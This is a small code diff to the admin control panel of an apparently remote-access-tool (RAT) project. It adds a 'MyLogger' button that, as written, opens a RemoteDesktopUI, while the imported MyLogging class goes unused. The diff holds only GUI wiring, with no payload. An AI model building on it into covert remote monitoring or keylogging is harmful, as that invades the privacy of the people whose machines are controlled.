@@ -10,6 +10,7 @@ from RATFunction.EchoUI import EchoUI
 from RATFunction.RATFunction import Side
 from RATFunction.RATFunctionRegistry import RATFunctionRegistry
 from RATFunction.RemoteDesktopUI import RemoteDesktopUI
+from RATFunction.MyLoggingUI import MyLogging
 
 
 class AdminNetworkThread(QThread):
@@ -48,6 +49,7 @@ class AdministratorControlPanel(QWidget):
 
         self.setup_echo()
         self.setup_remote_desktop()
+        self.setup_mylogger()
 
         self.reconnect()
 
@@ -118,4 +120,10 @@ class AdministratorControlPanel(QWidget):
 
     def gui_handle_packet(self, data):
         self.registry.route_packet(data)
+
+    def setup_mylogger(self):
+        self.mylogger_button = QPushButton('MyLogger', self)
+        self.mylogger_ui = RemoteDesktopUI(self.registry.get_function(2))
+        self.mylogger_button.clicked.connect(self.mylogger_ui.show)
+        self.add_button(self.mylogger_button)
 
